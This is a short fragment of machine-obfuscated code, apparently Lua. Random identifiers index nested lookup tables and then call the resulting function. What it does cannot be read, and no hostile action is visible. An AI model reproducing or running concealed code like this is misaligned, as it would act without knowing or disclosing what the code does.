xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[4][xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[2]](xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[4][xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[3]](YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana))() end)